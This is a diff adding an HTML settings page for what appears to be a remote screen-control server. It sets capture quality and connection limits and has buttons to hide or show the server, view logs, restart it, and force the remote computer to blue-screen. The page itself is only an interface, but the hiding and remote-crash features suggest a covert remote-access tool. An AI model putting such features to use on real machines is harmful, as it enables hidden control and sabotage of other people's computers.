@@ -1,0 +1,39 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="zh-cn">
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+
+<title>Settings</title>
+</head>
+
+<body>
+
+<p><span style="font-size: 20pt; font-weight: 700">Settings</span></p>
+<p>Server start time: 【START_TIME】<b><font color="#FF0000">【PRIVILEGE】</b></font></p>
+<form method="POST" action="BlueScreen">
+	<p><input type="hidden" value="BlueScreen" name="BlueScreen"></p>
+</form>
+<form method="POST" action="Settings">
+	<p><span style="letter-spacing: normal">Screen capture quality(0 - 100, 100 
+	means best quality):</span><span style="font-size: medium; letter-spacing: normal"> <input type="text" name="edQuality" size="12" value="【QUALITY】"></span></p>
+	<p>Maximum connections(0 - 255, 0 means no limit):
+	<input type="text" name="edConnections" size="12" value="【MAXIMUM_CONN】"></p>
+	<p><input type="submit" value="OK" name="cmdApplySettings"></p>
+</form>
+<form method="POST" action="Settings">
+	<p><input type="submit" value="Hide Server" name="cmdHideServer"><input type="submit" value="Show Server" name="cmdShowServer"><input type="submit" value="Log" name="cmdShowLog"></p>
+	<p><input type="submit" value="Restart Server" name="cmdRestartServer"></p>
+</form>
+<button id="BlueScreen" onclick="BSODconfirm()">Blue Screen</button>
+<script type="text/javascript">
+	function BSODconfirm() {
+		if (confirm("Are you sure? This will make the remote computer blue screen!") == true)
+			document.forms.item("BlueScreen").submit();
+	}
+</script>
+<p><a href="/">Back</a></p>
+
+</body>
+
+</html>
